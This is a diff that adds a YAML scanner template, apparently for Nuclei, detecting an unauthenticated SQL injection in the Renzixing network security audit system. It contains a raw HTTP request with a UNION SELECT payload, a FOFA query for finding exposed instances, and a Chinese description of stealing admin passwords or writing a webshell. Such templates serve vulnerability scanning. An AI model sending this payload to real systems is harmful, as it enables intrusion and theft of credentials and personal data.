@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '{"group":[{"'
+            - '"page":'
+            - '{"total":0}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+          Referer: https://{{Hostname}}
+id: renzixing-log_fw_ips_scan_jsondata-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: title="任子行网络安全审计系统"
+        任子行网络安全审计系统 log_fw_ips_scan_jsondata 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 任子行网络安全审计系统 log_fw_ips_scan_jsondata SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/aJUGCEUn50PoiRtPxO69iQ?token=827319261&lang=zh_CN
+    severity: high
+    tags: []
